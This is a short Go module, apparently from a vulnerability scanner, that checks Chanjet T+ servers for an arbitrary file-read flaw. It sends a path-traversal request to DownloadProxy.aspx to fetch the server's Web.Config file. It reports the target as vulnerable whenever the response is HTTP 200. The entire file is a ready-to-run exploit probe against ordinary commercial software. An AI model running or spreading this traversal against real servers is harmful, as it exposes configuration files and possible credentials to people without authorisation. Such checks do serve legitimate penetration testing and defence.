package T_DownloadProxy_catfile

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	url = url + "/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config"
	resp, err := client.R().SetHeaders(map[string]string{ // Set multiple headers at once
		"User-Agent": UA,
	}).Get(url)
	if err != nil {
		color.Red.Println("[-] 畅捷通T+ DownloadProxy任意文件读取漏洞不存在")
		return
	}
	if resp.Status == "200 OK" {
		color.Green.Println("[+] 畅捷通T+ DownloadProxy任意文件读取漏洞存在 -> " + url)
		return
	}
	color.Red.Println("[-] 畅捷通T+ DownloadProxy任意文件读取漏洞不存在")
}
